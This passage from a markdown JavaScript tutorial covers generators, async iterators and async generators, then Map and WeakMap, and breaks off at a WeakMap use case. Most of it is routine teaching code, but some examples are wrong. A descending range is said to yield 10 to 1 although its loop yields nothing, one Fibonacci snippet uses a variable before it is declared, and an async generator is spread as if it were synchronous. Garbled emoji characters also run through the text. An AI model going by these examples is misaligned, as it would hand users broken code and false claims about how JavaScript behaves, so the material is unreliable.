  const result = yield* inner();  // Passes values through
  yield `outer end: ${result}`;
}

const iter = outer();
console.log(iter.next());        // { value: 'outer start', done: false }
console.log(iter.next(5));       // { value: 'inner', done: false }
console.log(iter.next(10));      // { value: 'outer end: 20', done: false }
console.log(iter.next());        // { done: true }
```

---

## Passing Values to Generators

### Sending Values with next()

```javascript
function* dialog() {
  const name = yield 'What is your name?';
  console.log(`Hello, ${name}!`);
  
  const age = yield 'How old are you?';
  console.log(`You are ${age} years old`);
  
  return `Nice to meet you, ${name}!`;
}

const iter = dialog();

// First next() starts the generator
const q1 = iter.next();
console.log(q1.value);  // 'What is your name?'

// Provide answer to first question
const q2 = iter.next('Alice');  // Logs 'Hello, Alice!'
console.log(q2.value);  // 'How old are you?'

// Provide answer to second question
const result = iter.next(30);  // Logs 'You are 30 years old'
console.log(result.value);  // 'Nice to meet you, Alice!'
```

### Practical Example: Range with Step

```javascript
// Traditional range (with iterator)
class Range {
  constructor(start, end, step = 1) {
    this.start = start;
    this.end = end;
    this.step = step;
  }
  
  [Symbol.iterator]() {
    let current = this.start;
    const end = this.end;
    const step = this.step;
    
    return {
      next: () => current < end
        ? { value: current, done: false }
        : { done: true }
    };
  }
}

// Generator version (simpler!)
function* range(start, end, step = 1) {
  for (let i = start; i < end; i += step) {
    yield i;
  }
}

console.log([...range(0, 5)]);        // [0, 1, 2, 3, 4]
console.log([...range(0, 10, 2)]);    // [0, 2, 4, 6, 8]
console.log([...range(10, 0, -1)]);   // [10, 9, 8, ..., 1]
```

---

## Error Handling in Generators

### Throwing Errors into Generators

```javascript
function* errorHandler() {
  try {
    const x = yield 'value1';
    console.log('x =', x);
  } catch (err) {
    console.log('caught error:', err.message);
  }
  
  yield 'value2';
}

const iter = errorHandler();
console.log(iter.next());        // { value: 'value1', done: false }
console.log(iter.throw(new Error('oops')));  // Logs 'caught error: oops', returns { value: 'value2', done: false }
```

### Generator Error Recovery

```javascript
function* withRecovery() {
  let attempts = 0;
  while (attempts < 3) {
    try {
      yield `attempt ${++attempts}`;
    } catch (err) {
      console.log(`Error: ${err.message}`);
      if (attempts >= 3) throw err;  // Re-throw after max attempts
    }
  }
}

const iter = withRecovery();
console.log(iter.next());              // { value: 'attempt 1', done: false }
console.log(iter.throw(new Error('fail')));  // Logs error, yields next
console.log(iter.next());              // { value: 'attempt 2', done: false }
```

### Generator finally Block

```javascript
function* withCleanup() {
  try {
    yield 1;
    yield 2;
    throw new Error('oops');
  } finally {
    console.log('cleaning up');
  }
}

const iter = withCleanup();
console.log(iter.next());  // { value: 1, done: false }
console.log(iter.next());  // { value: 2, done: false }

try {
  console.log(iter.next());  // Logs 'cleaning up', then throws
} catch (err) {
  console.log(err.message);  // 'oops'
}
```

---

## Infinite Sequences

### Infinite Counter

```javascript
// âœ… Generator makes this simple
function* infiniteCounter(start = 0) {
  let i = start;
  while (true) {
    yield i++;
  }
}

// Use with break or take limit
let count = 0;
for (const num of infiniteCounter(100)) {
  console.log(num);  // 100, 101, 102, ...
  if (++count >= 5) break;
}
```

### Fibonacci Sequence

```javascript
function* fibonacci() {
  let [a, b] = [0, 1];
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

// Get first 10 Fibonacci numbers
const fibs = [...Array(10)].map((_, i) => {
  if (i === 0) return gen.next();
  return gen.next();
}).map(r => r.value);

// Better approach
const gen = fibonacci();
const fibs2 = Array.from({ length: 10 }, () => gen.next().value);
console.log(fibs2);  // [0, 1, 1, 2, 3, 5, 8, 13, 21, 34]
```

### Prime Numbers

```javascript
function* primes() {
  const isPrime = (n) => {
    for (let i = 2; i * i <= n; i++) {
      if (n % i === 0) return false;
    }
    return true;
  };
  
  let candidate = 2;
  while (true) {
    if (isPrime(candidate)) {
      yield candidate;
    }
    candidate++;
  }
}

// Get first 10 primes
const gen = primes();
const first10 = Array.from({ length: 10 }, () => gen.next().value);
console.log(first10);  // [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]
```

---

## Practical Generator Examples

### Example 1: File Reading Simulation

```javascript
function* readLines(text) {
  for (const line of text.split('\n')) {
    yield line;
  }
}

const content = `Line 1
Line 2
Line 3`;

for (const line of readLines(content)) {
  console.log(line);
}
```

### Example 2: Permutations

```javascript
function* permutations(arr) {
  if (arr.length <= 1) {
    yield arr;
  } else {
    for (let i = 0; i < arr.length; i++) {
      const rest = [...arr.slice(0, i), ...arr.slice(i + 1)];
      for (const perm of permutations(rest)) {
        yield [arr[i], ...perm];
      }
    }
  }
}

console.log([...permutations([1, 2, 3])]);
// Output: all 6 permutations of [1,2,3]
```

### Example 3: API Pagination

```javascript
function* paginate(apiCall, pageSize) {
  let page = 1;
  let hasMore = true;
  
  while (hasMore) {
    const response = apiCall(page, pageSize);
    hasMore = response.hasMore;
    yield response.data;
    page++;
  }
}

// Usage
function mockApi(page, size) {
  return {
    data: Array.from({ length: size }, (_, i) => (page - 1) * size + i + 1),
    hasMore: page < 3
  };
}

for (const batch of paginate(mockApi, 5)) {
  console.log('batch:', batch);
}
```

### Example 4: Generator Composition

```javascript
function* map(iterable, transform) {
  for (const value of iterable) {
    yield transform(value);
  }
}

function* filter(iterable, predicate) {
  for (const value of iterable) {
    if (predicate(value)) {
      yield value;
    }
  }
}

function* take(iterable, n) {
  let count = 0;
  for (const value of iterable) {
    if (count++ < n) {
      yield value;
    } else {
      break;
    }
  }
}

// Compose generators
const data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
const result = [...take(
  filter(
    map(data, x => x * 2),
    x => x > 5
  ),
  3
)];

console.log(result);  // [6, 8, 10]
```

---

## Part 3: Async Iterators (Module 11.4)


## Async Iterable Protocol

### What is the Async Iterable Protocol?

The **async iterable protocol** allows iteration over asynchronous data streams using `for await...of`.

```javascript
// Async iterable interface
object[Symbol.asyncIterator]() {
  return {
    async next() {
      return {
        value: any,      // May be a Promise
        done: boolean
      };
    }
  };
}
```

### Synchronous vs Asynchronous Iteration

```javascript
// Synchronous - immediate values
const syncIterable = {
  [Symbol.iterator]() {
    const data = [1, 2, 3];
    let index = 0;
    return {
      next: () => index < data.length
        ? { value: data[index++], done: false }
        : { done: true }
    };
  }
};

for (const value of syncIterable) {
  console.log(value);  // 1, 2, 3
}

// Asynchronous - promises/delayed values
const asyncIterable = {
  [Symbol.asyncIterator]() {
    const data = [1, 2, 3];
    let index = 0;
    return {
      async next() {
        await new Promise(resolve => setTimeout(resolve, 1000));
        return index < data.length
          ? { value: data[index++], done: false }
          : { done: true }
      }
    };
  }
};

// Can only iterate with for await...of
for await (const value of asyncIterable) {
  console.log(value);  // 1, 2, 3 (each after 1 second)
}
```

---

## Symbol.asyncIterator

### Creating Async Iterables

```javascript
// âœ… Manual async iterable
class AsyncRange {
  constructor(start, end, delay = 100) {
    this.start = start;
    this.end = end;
    this.delay = delay;
  }
  
  [Symbol.asyncIterator]() {
    let current = this.start;
    const end = this.end;
    const delay = this.delay;
    
    return {
      async next() {
        await new Promise(resolve => setTimeout(resolve, delay));
        
        if (current < end) {
          return { value: current++, done: false };
        }
        return { done: true };
      }
    };
  }
}

// Usage
for await (const num of new AsyncRange(1, 5, 500)) {
  console.log(num);  // 1, 2, 3, 4 (each after 500ms)
}
```

### Checking for Async Iterability

```javascript
// Check if async iterable
function isAsyncIterable(obj) {
  return obj != null && typeof obj[Symbol.asyncIterator] === 'function';
}

console.log(isAsyncIterable(new AsyncRange(1, 5)));  // true
console.log(isAsyncIterable([1, 2, 3]));             // false

// Objects can be both sync and async iterable
class BothIterables {
  [Symbol.iterator]() {
    // Sync iteration
    return {
      next: () => ({ value: 1, done: false })
    };
  }
  
  [Symbol.asyncIterator]() {
    // Async iteration
    return {
      async next() {
        await new Promise(r => setTimeout(r, 100));
        return { value: 1, done: false };
      }
    };
  }
}

for (const x of new BothIterables()) { }  // Sync
for await (const x of new BothIterables()) { }  // Async
```

---

## for await...of Loops

### Basic for await...of

```javascript
// Async generator (covered next)
async function* count(max) {
  for (let i = 1; i <= max; i++) {
    await new Promise(r => setTimeout(r, 500));
    yield i;
  }
}

// Use with for await...of
async function main() {
  for await (const num of count(5)) {
    console.log(num);  // 1, 2, 3, 4, 5 (each after 500ms)
  }
  console.log('done');
}

main();
```

### for await...of with Promises

```javascript
// Array of promises
async function processPromises() {
  const promises = [
    new Promise(r => setTimeout(() => r('first'), 1000)),
    new Promise(r => setTimeout(() => r('second'), 500)),
    new Promise(r => setTimeout(() => r('third'), 1500))
  ];
  
  for await (const result of promises) {
    console.log(result);  // Waits for each promise
  }
}

// âš ï¸ Still waits for all, not just next available
```

### Error Handling in for await...of

```javascript
async function* withError() {
  yield 1;
  yield 2;
  throw new Error('Something went wrong');
}

async function main() {
  try {
    for await (const value of withError()) {
      console.log(value);  // 1, 2
    }
  } catch (err) {
    console.log('caught:', err.message);  // 'Something went wrong'
  }
}

main();
```

---

## Async Generators

### Async Generator Syntax

```javascript
// Async generator function
async function* asyncGen() {
  yield 1;
  await new Promise(r => setTimeout(r, 1000));
  yield 2;
  await new Promise(r => setTimeout(r, 1000));
  yield 3;
}

// Use with for await...of
async function main() {
  for await (const value of asyncGen()) {
    console.log(value);  // 1, 2, 3 (with delays)
  }
}

main();
```

### Combining async and yield

```javascript
// Fetch data asynchronously
async function* fetchBatches(urls) {
  for (const url of urls) {
    try {
      const response = await fetch(url);
      const data = await response.json();
      yield data;
    } catch (err) {
      console.error(`Failed to fetch ${url}:`, err);
    }
  }
}

// Usage
async function main() {
  const urls = [
    'https://api.example.com/page1',
    'https://api.example.com/page2',
    'https://api.example.com/page3'
  ];
  
  for await (const data of fetchBatches(urls)) {
    console.log('data:', data);
  }
}
```

### Yielding Promises

```javascript
// Async generator with parallel operations
async function* parallel() {
  yield Promise.resolve(1);
  yield Promise.resolve(2);
  yield Promise.resolve(3);
}

async function main() {
  // Sequential resolution
  for await (const promise of parallel()) {
    const result = await promise;
    console.log(result);  // 1, 2, 3
  }
  
  // Or resolve in parallel
  const promises = [...parallel()];
  const results = await Promise.all(promises);
  console.log(results);  // [1, 2, 3]
}

main();
```

---

## Streaming Data

### Example 1: Reading File Chunks (Node.js)

```javascript
// Node.js fs.createReadStream is async iterable
const fs = require('fs');

async function readFile() {
  const stream = fs.createReadStream('large-file.txt', { encoding: 'utf8', highWaterMark: 1024 });
  
  for await (const chunk of stream) {
    console.log(`Chunk size: ${chunk.length}`);
  }
}

readFile();
```

### Example 2: Custom Stream Generator

```javascript
// Simulate data streaming
async function* dataStream(delayMs = 100) {
  const data = ['chunk1', 'chunk2', 'chunk3', 'chunk4', 'chunk5'];
  
  for (const chunk of data) {
    await new Promise(resolve => setTimeout(resolve, delayMs));
    yield chunk;
  }
}

async function processStream() {
  let totalSize = 0;
  
  for await (const chunk of dataStream(500)) {
    console.log(`Received: ${chunk}`);
    totalSize += chunk.length;
  }
  
  console.log(`Total size: ${totalSize}`);
}

processStream();
```

### Example 3: Database Cursor Iteration

```javascript
// Simulate database cursor
async function* databaseCursor(query, pageSize = 10) {
  let offset = 0;
  let hasMore = true;
  
  while (hasMore) {
    const results = await executeQuery(`${query} LIMIT ${pageSize} OFFSET ${offset}`);
    
    if (results.length === 0) {
      hasMore = false;
    } else {
      yield* results;  // Yield each result
      offset += pageSize;
    }
  }
}

async function main() {
  for await (const record of databaseCursor('SELECT * FROM users')) {
    console.log(record);
  }
}
```

---

## Pagination with Async

### Example 1: API Pagination

```javascript
async function* paginate(apiUrl, pageSize = 20) {
  let page = 1;
  let hasMore = true;
  
  while (hasMore) {
    const response = await fetch(`${apiUrl}?page=${page}&pageSize=${pageSize}`);
    const data = await response.json();
    
    if (data.items.length === 0) {
      hasMore = false;
    } else {
      yield* data.items;  // Yield each item
      page++;
    }
  }
}

async function main() {
  for await (const item of paginate('https://api.example.com/users')) {
    console.log(item.name);
  }
}

main();
```

### Example 2: Cursor-Based Pagination

```javascript
async function* cursorPaginate(apiUrl, pageSize = 20) {
  let cursor = null;
  
  while (true) {
    const url = cursor
      ? `${apiUrl}?pageSize=${pageSize}&after=${cursor}`
      : `${apiUrl}?pageSize=${pageSize}`;
    
    const response = await fetch(url);
    const data = await response.json();
    
    if (data.items.length === 0) {
      break;
    }
    
    yield* data.items;
    
    // Cursor from last item
    cursor = data.nextCursor;
    
    if (!cursor) break;  // No more pages
  }
}

async function main() {
  for await (const item of cursorPaginate('https://api.example.com/users')) {
    console.log(item);
  }
}

main();
```

---

## Error Handling

### Try-Catch in Async Generators

```javascript
async function* resilientPaginate(apiUrl) {
  let page = 1;
  let maxRetries = 3;
  
  while (true) {
    let retries = 0;
    let success = false;
    let data;
    
    while (retries < maxRetries && !success) {
      try {
        const response = await fetch(`${apiUrl}?page=${page}`);
        data = await response.json();
        success = true;
      } catch (err) {
        retries++;
        if (retries >= maxRetries) {
          throw new Error(`Failed to fetch page ${page} after ${maxRetries} retries`);
        }
        // Wait before retry
        await new Promise(r => setTimeout(r, 1000 * retries));
      }
    }
    
    if (data.items.length === 0) break;
    
    yield* data.items;
    page++;
  }
}

async function main() {
  try {
    for await (const item of resilientPaginate('https://api.example.com/users')) {
      console.log(item);
    }
  } catch (err) {
    console.error('Error:', err.message);
  }
}

main();
```

### Handling Individual Item Errors

```javascript
async function* processWithErrorHandling(items) {
  for (const item of items) {
    try {
      const processed = await process(item);
      yield processed;
    } catch (err) {
      console.error(`Error processing ${item}:`, err);
      // Continue with next item instead of throwing
    }
  }
}

async function main() {
  const items = ['valid', 'invalid', 'valid2'];
  
  for await (const result of processWithErrorHandling(items)) {
    console.log('processed:', result);
  }
}

main();
```

---

## Summary

### Key Concepts Across All Modules

| Concept | Purpose |
|---------|---------|
| **Iterable Protocol** | Objects with Symbol.iterator |
| **Iterator Protocol** | Objects with next() method |
| **Built-in Iterables** | Array, String, Map, Set, etc. |
| **Generators** | Functions that yield values |
| **Async Iterables** | Objects with Symbol.asyncIterator |
| **Async Generators** | async function* with yield |
| **for...of** | Iterate over iterables |
| **for await...of** | Iterate over async iterables |

### Common Use Cases

**Module 11.1 - Iteration Protocols:**
- Custom iteration logic
- Making objects for...of compatible
- Implementing data structures

**Module 11.2 - Built-in Iterables:**
- Working with built-in types
- Understanding what's iterable
- Choosing the right method

**Module 11.3 - Generators:**
- Simplifying iterator creation
- Lazy evaluation
- Infinite sequences

**Module 11.4 - Async Iterators:**
- Handling async data streams
- Pagination and cursor-based fetching
- Real-time data processing

### Next Steps

- Combine all techniques for advanced data processing
- Implement custom protocols with multiple iteration strategies
- Build production-grade async data pipelines
- Explore advanced patterns like backpressure and flow control

## 11.3 Iterators Summary

| Protocol | Required Method |
|----------|-----------------|
| Iterable | `[Symbol.iterator]()` returns iterator |
| Iterator | `next()` returns `{value, done}` |
| Async Iterable | `[Symbol.asyncIterator]()` |
| Generator | `function*` with `yield` |

---

**End of Chapter 11: Iterators and Generators**


# 12-Collections.md

# 12 Collections

ES6 introduced `Map`, `Set`, `WeakMap`, and `WeakSet`â€”specialized collections for specific use cases beyond plain objects and arrays.

---

## Maps and WeakMaps



## Creating Maps

### Basic Map Creation

```javascript
// âœ… Empty map
const map1 = new Map();

// âœ… Initialize with entries (array of [key, value] pairs)
const map2 = new Map([
  ['a', 1],
  ['b', 2],
  ['c', 3]
]);

console.log(map2.size);  // 3

// âœ… Initialize from object entries
const obj = { x: 10, y: 20 };
const map3 = new Map(Object.entries(obj));

console.log(map3.get('x'));  // 10
```

### Creating Maps with Different Key Types

```javascript
// âœ… Different key types
const map = new Map();

// String keys
map.set('name', 'Alice');

// Number keys
map.set(1, 'first');
map.set(2, 'second');

// Object keys (reference-based)
const obj1 = { id: 1 };
const obj2 = { id: 2 };
map.set(obj1, 'object 1');
map.set(obj2, 'object 2');

// Function keys
const fn = () => console.log('hello');
map.set(fn, 'function value');

// Symbol keys
const sym = Symbol('key');
map.set(sym, 'symbol value');

// NaN is special - all NaN values are the same key
map.set(NaN, 'nan value');
map.set(NaN, 'updated nan');  // Overwrites previous
console.log(map.get(NaN));  // 'updated nan'

// But undefined, null, false, 0 are different keys
map.set(undefined, 'undefined');
map.set(null, 'null');
map.set(false, 'false');
map.set(0, 'zero');
```

### Map with Complex Initialization

```javascript
// Initialize from another map
const original = new Map([['a', 1], ['b', 2]]);
const copy = new Map(original);

console.log(copy.get('a'));  // 1
console.log(copy === original);  // false (new map instance)

// Convert from object with entries
const data = { name: 'Bob', age: 30, city: 'NYC' };
const map = new Map(Object.entries(data));

// Convert from array
const pairs = [['id', 123], ['status', 'active']];
const mapFromArray = new Map(pairs);
```

---

## Map Methods: set(), get(), has(), delete(), clear()

### set() - Adding and Updating Values

```javascript
const map = new Map();

// âœ… Add new key-value pair
map.set('key1', 'value1');

// âœ… Update existing key (overwrites)
map.set('key1', 'updated value');

// âœ… set() returns the map (allows chaining)
map.set('key2', 'value2')
   .set('key3', 'value3')
   .set('key4', 'value4');

console.log(map.size);  // 4

// âœ… Works with any key type
map.set(42, 'numeric key');
map.set(true, 'boolean key');
map.set({ id: 1 }, 'object key');

// âœ… Can store any value type
map.set('array', [1, 2, 3]);
map.set('obj', { nested: true });
map.set('fn', () => 'callable');
map.set('null', null);
map.set('undefined', undefined);
```

### get() - Retrieving Values

```javascript
const map = new Map([
  ['name', 'Alice'],
  [1, 'one'],
  [true, 'yes']
]);

// âœ… Get value by key
console.log(map.get('name'));    // 'Alice'
console.log(map.get(1));         // 'one'
console.log(map.get(true));      // 'yes'

// âœ… Returns undefined if key not found
console.log(map.get('missing'));  // undefined

// âœ… Distinguish between not found and stored undefined
const map2 = new Map();
map2.set('key1', undefined);

console.log(map2.get('key1'));      // undefined (stored value)
console.log(map2.get('key2'));      // undefined (not found)
console.log(map2.has('key1'));      // true (distinguishes!)
console.log(map2.has('key2'));      // false

// âœ… Safe get with default value
function getOrDefault(map, key, defaultValue) {
  return map.has(key) ? map.get(key) : defaultValue;
}

console.log(getOrDefault(map, 'name', 'Unknown'));    // 'Alice'
console.log(getOrDefault(map, 'age', 25));            // 25
```

### has() - Checking for Keys

```javascript
const map = new Map([
  ['name', 'Alice'],
  [42, 'answer'],
  [null, 'nullish'],
  [undefined, 'void']
]);

// âœ… Check if key exists
console.log(map.has('name'));       // true
console.log(map.has(42));           // true
console.log(map.has(null));         // true
console.log(map.has(undefined));    // true

// âœ… Returns false for missing keys
console.log(map.has('missing'));    // false
console.log(map.has(0));            // false

// âœ… Use in conditionals
if (map.has('name')) {
  console.log(`Name is ${map.get('name')}`);
}

// âœ… Safe retrieval pattern
function getValue(map, key) {
  if (map.has(key)) {
    return map.get(key);
  }
  throw new Error(`Key ${key} not found in map`);
}
```

### delete() - Removing Values

```javascript
const map = new Map([
  ['a', 1],
  ['b', 2],
  ['c', 3]
]);

console.log(map.size);  // 3

// âœ… Delete returns true if key existed
console.log(map.delete('b'));  // true (key was deleted)
console.log(map.delete('b'));  // false (already deleted)
console.log(map.delete('z'));  // false (never existed)

console.log(map.size);  // 2
console.log(map.has('b'));  // false

// âœ… Chained conditional deletion
if (map.has('a')) {
  map.delete('a');  // Safe to delete without checking
}

// âœ… Delete object keys
const obj = { id: 1 };
const map2 = new Map();
map2.set(obj, 'value');

console.log(map2.delete(obj));  // true
console.log(map2.has(obj));     // false

// Note: Different object reference means different key
const obj2 = { id: 1 };  // Different instance
console.log(map2.has(obj2));  // false
```

### clear() - Removing All Values

```javascript
const map = new Map([
  ['a', 1],
  ['b', 2],
  ['c', 3],
  ['d', 4],
  ['e', 5]
]);

console.log(map.size);  // 5

// âœ… clear() removes all entries
map.clear();

console.log(map.size);  // 0
console.log(map.has('a'));  // false

// âœ… After clear, map is reusable
map.set('new', 'value');
console.log(map.size);  // 1
```

---

## Map Size and Properties

### The size Property

```javascript
const map = new Map();

// âœ… size property (read-only)
console.log(map.size);  // 0

map.set('a', 1);
console.log(map.size);  // 1

map.set('b', 2);
console.log(map.size);  // 2

// âœ… size updates automatically
map.set('a', 'updated');  // No size change (key exists)
console.log(map.size);  // 2

map.delete('b');
console.log(map.size);  // 1

// âœ… Can't set size directly
map.size = 5;  // Silently fails (or throws in strict mode)
console.log(map.size);  // Still 1

// âœ… Get accurate size
function getMapSize(map) {
  return map.size;  // Always correct
}

// âŒ Different from object
const obj = { a: 1, b: 2 };
console.log(Object.keys(obj).length);  // Need to count manually
```

### Constructor Property

```javascript
const map = new Map();
console.log(map.constructor === Map);  // true

// âœ… Can check if something is a Map
function isMap(obj) {
  return obj instanceof Map;
  // or: obj.constructor === Map;
  // or: Object.prototype.toString.call(obj) === '[object Map]';
}

console.log(isMap(new Map()));      // true
console.log(isMap({}));             // false
console.log(isMap(new Set()));      // false
```

---

## Iterating Maps

### Iterating with for...of

```javascript
const map = new Map([
  ['name', 'Alice'],
  ['age', 30],
  ['city', 'NYC']
]);

// âœ… Default iteration yields [key, value] pairs
for (const [key, value] of map) {
  console.log(`${key}: ${value}`);
}
// Output:
// name: Alice
// age: 30
// city: NYC

// âœ… Can iterate without destructuring
for (const entry of map) {
  console.log(entry);  // ['name', 'Alice'], ['age', 30], etc.
}
```

### keys() - Iterating Keys Only

```javascript
const map = new Map([
  ['a', 1],
  ['b', 2],
  ['c', 3]
]);

// âœ… Iterate keys
for (const key of map.keys()) {
  console.log(key);  // 'a', 'b', 'c'
}

// âœ… Convert to array
const keyArray = [...map.keys()];
console.log(keyArray);  // ['a', 'b', 'c']

// âœ… Find specific key
const keys = Array.from(map.keys());
const hasKeyStartingWithB = keys.some(k => String(k).startsWith('b'));
```

### values() - Iterating Values Only

```javascript
const map = new Map([
  ['a', 10],
  ['b', 20],
  ['c', 30]
]);

// âœ… Iterate values
for (const value of map.values()) {
  console.log(value);  // 10, 20, 30
}

// âœ… Convert to array
const valueArray = [...map.values()];
console.log(valueArray);  // [10, 20, 30]

// âœ… Sum all values
const total = Array.from(map.values()).reduce((sum, v) => sum + v, 0);
console.log(total);  // 60
```

### entries() - Explicit Entry Iteration

```javascript
const map = new Map([
  ['x', 100],
  ['y', 200]
]);

// âœ… Explicitly get entries
for (const [key, value] of map.entries()) {
  console.log(`${key} => ${value}`);
}

// âœ… entries() is same as default iteration
for (const entry of map.entries()) {
  console.log(entry);  // Same as: for (const entry of map)
}

// âœ… Convert entries to array
const entriesArray = Array.from(map.entries());
console.log(entriesArray);  // [['x', 100], ['y', 200]]
```

### forEach() - Functional Iteration

```javascript
const map = new Map([
  ['name', 'Alice'],
  ['role', 'Developer'],
  ['level', 'Senior']
]);

// âœ… forEach with callback
map.forEach((value, key) => {
  console.log(`${key}: ${value}`);
});

// âœ… forEach with this context
class Processor {
  constructor(prefix) {
    this.prefix = prefix;
  }
  
  process(map) {
    map.forEach(function(value, key) {
      console.log(`${this.prefix}${key}: ${value}`);
    }, this);
  }
}

new Processor('>> ').process(map);

// âœ… Collecting values
const values = [];
map.forEach(value => values.push(value));
console.log(values);
```

---

## Maps vs Objects

### Feature Comparison

```javascript
// âœ… Maps with any key type
const map = new Map();
map.set({}, 'object key');
map.set(() => {}, 'function key');
map.set(Symbol('s'), 'symbol key');
map.set(NaN, 'NaN key');

// âŒ Objects convert keys to strings
const obj = {};
obj[{}] = 'value';  // Key becomes '[object Object]'
obj[() => {}] = 'value';  // Key becomes string representation
console.log(Object.keys(obj));  // All string keys
```

### Size Property

```javascript
// âœ… Maps have .size
const map = new Map([['a', 1], ['b', 2]]);
console.log(map.size);  // 2

// âŒ Objects don't have .size
const obj = { a: 1, b: 2 };
console.log(obj.size);  // undefined
console.log(Object.keys(obj).length);  // Manual count needed
```

### Iteration

```javascript
// âœ… Maps are directly iterable
const map = new Map([['a', 1], ['b', 2]]);
for (const [key, value] of map) {
  console.log(key, value);
}

// âŒ Objects need Object methods
const obj = { a: 1, b: 2 };
for (const key of Object.keys(obj)) {
  console.log(key, obj[key]);
}
```

### Performance

```javascript
// âœ… Maps optimize for frequent add/delete
const map = new Map();
for (let i = 0; i < 1000000; i++) {
  map.set(i, i * 2);
}
for (let i = 0; i < 500000; i++) {
  map.delete(i);
}

// âŒ Objects less optimized for frequent changes
const obj = {};
for (let i = 0; i < 1000000; i++) {
  obj[i] = i * 2;  // Slower
}
```

### When to Use Each

```javascript
// âœ… Use Maps when:
// - Keys aren't simple strings
// - Frequent additions/deletions
// - Need to preserve insertion order
// - Need to count entries with .size

// âœ… Use Objects when:
// - Keys are always strings/symbols
// - Using JSON serialization
// - Need method definitions
// - Prototype inheritance needed
// - Relatively static data

// Example: Cache with object keys
const userCache = new Map();
const userObj = { id: 1, name: 'Alice' };
userCache.set(userObj, 'cached data');
// Objects as keys only work with Map, not plain object

// Example: Configuration with string keys
const config = {
  apiUrl: 'https://api.example.com',
  timeout: 5000,
  retries: 3
};
// Object is better here (simpler, JSON-compatible)
```

---

## Practical Map Examples

### Example 1: User Registry

```javascript
class UserRegistry {
  constructor() {
    this.users = new Map();  // id -> user object
  }
  
  add(id, name, email) {
    this.users.set(id, { id, name, email });
  }
  
  get(id) {
    return this.users.get(id);
  }
  
  exists(id) {
    return this.users.has(id);
  }
  
  remove(id) {
    return this.users.delete(id);
  }
  
  getAll() {
    return Array.from(this.users.values());
  }
  
  count() {
    return this.users.size;
  }
}

const registry = new UserRegistry();
registry.add(1, 'Alice', 'alice@example.com');
registry.add(2, 'Bob', 'bob@example.com');

console.log(registry.count());  // 2
console.log(registry.get(1));   // { id: 1, name: 'Alice', ... }
console.log(registry.getAll()); // [{ id: 1, ... }, { id: 2, ... }]
```

### Example 2: Frequency Counter

```javascript
function countFrequency(items) {
  const frequency = new Map();
  
  for (const item of items) {
    if (frequency.has(item)) {
      frequency.set(item, frequency.get(item) + 1);
    } else {
      frequency.set(item, 1);
    }
  }
  
  return frequency;
}

const items = ['apple', 'banana', 'apple', 'cherry', 'banana', 'apple'];
const counts = countFrequency(items);

console.log(counts.get('apple'));   // 3
console.log(counts.get('banana'));  // 2
console.log(counts.get('cherry'));  // 1

// Find most common
let max = 0;
let maxItem = null;
for (const [item, count] of counts) {
  if (count > max) {
    max = count;
    maxItem = item;
  }
}
console.log(`Most common: ${maxItem} (${max} times)`);
```

### Example 3: Graph Adjacency List

```javascript
class Graph {
  constructor() {
    this.adjacencyList = new Map();
  }
  
  addVertex(vertex) {
    if (!this.adjacencyList.has(vertex)) {
      this.adjacencyList.set(vertex, []);
    }
  }
  
  addEdge(vertex1, vertex2) {
    this.addVertex(vertex1);
    this.addVertex(vertex2);
    
    this.adjacencyList.get(vertex1).push(vertex2);
    this.adjacencyList.get(vertex2).push(vertex1);  // Undirected
  }
  
  getNeighbors(vertex) {
    return this.adjacencyList.get(vertex) || [];
  }
  
  display() {
    for (const [vertex, neighbors] of this.adjacencyList) {
      console.log(`${vertex} -> ${neighbors.join(', ')}`);
    }
  }
}

const graph = new Graph();
graph.addEdge('A', 'B');
graph.addEdge('B', 'C');
graph.addEdge('C', 'A');

graph.display();
// A -> B, C
// B -> A, C
// C -> B, A
```

### Example 4: Command Handler Registry

```javascript
class CommandDispatcher {
  constructor() {
    this.handlers = new Map();
  }
  
  register(command, handler) {
    if (this.handlers.has(command)) {
      throw new Error(`Command '${command}' already registered`);
    }
    this.handlers.set(command, handler);
  }
  
  execute(command, ...args) {
    if (!this.handlers.has(command)) {
      throw new Error(`Unknown command: ${command}`);
    }
    
    const handler = this.handlers.get(command);
    return handler(...args);
  }
  
  listCommands() {
    return Array.from(this.handlers.keys());
  }
}

const dispatcher = new CommandDispatcher();

dispatcher.register('greet', (name) => `Hello, ${name}!`);
dispatcher.register('add', (a, b) => a + b);
dispatcher.register('multiply', (a, b) => a * b);

console.log(dispatcher.execute('greet', 'Alice'));      // 'Hello, Alice!'
console.log(dispatcher.execute('add', 5, 3));          // 8
console.log(dispatcher.execute('multiply', 4, 6));     // 24
console.log(dispatcher.listCommands());                // ['greet', 'add', 'multiply']
```

---

## WeakMap: Weak References

### What is a WeakMap?

A **WeakMap** is like a Map but:
- Keys must be **objects** only
- Keys are held **weakly** (don't prevent garbage collection)
- Keys can be garbage collected even if in WeakMap
- **Not iterable** (no forEach, no iteration methods)

```javascript
// âœ… WeakMap with object keys
const weakMap = new WeakMap();
const obj1 = { id: 1 };
const obj2 = { id: 2 };

weakMap.set(obj1, 'data for obj1');
weakMap.set(obj2, 'data for obj2');

console.log(weakMap.get(obj1));  // 'data for obj1'
console.log(weakMap.get(obj2));  // 'data for obj2'

// âŒ WeakMap cannot have primitive keys
const wm = new WeakMap();
// wm.set('string', 'value');  // TypeError
// wm.set(42, 'value');         // TypeError
// wm.set(true, 'value');       // TypeError
```

### Weak References Explained

```javascript
// âœ… Regular Map holds strong reference
const map = new Map();
let obj = { id: 1 };
map.set(obj, 'data');

// Even if we remove our reference:
obj = null;

// Object is STILL in memory (kept alive by Map)
console.log(map.get(obj));  // Cannot access (obj is null)
console.log(map.size);      // 1 (still there!)

// âœ… WeakMap holds weak reference
const weakMap = new WeakMap();
let obj2 = { id: 2 };
weakMap.set(obj2, 'data');

// When we remove our reference:
obj2 = null;

// Object CAN be garbage collected (no strong reference)
// weakMap still has it, but it will disappear after GC
console.log(weakMap.size);  // âŒ No .size property!
```

### WeakMap Methods and Behavior

```javascript
// âœ… WeakMap has limited methods
const weakMap = new WeakMap();
const key = { id: 1 };

// âœ… set() - Add/update
weakMap.set(key, 'value');

// âœ… get() - Retrieve
console.log(weakMap.get(key));  // 'value'

// âœ… has() - Check existence
console.log(weakMap.has(key));  // true

// âœ… delete() - Remove
weakMap.delete(key);
console.log(weakMap.has(key));  // false

// âŒ NO size property
console.log(weakMap.size);  // undefined

// âŒ NO iteration methods
// weakMap.forEach(...)  // TypeError
// for (const entry of weakMap) {}  // TypeError
// [...weakMap.keys()]  // TypeError
```

---

## WeakMap Use Cases

### Use Case 1: Private Data Storage

```javascript
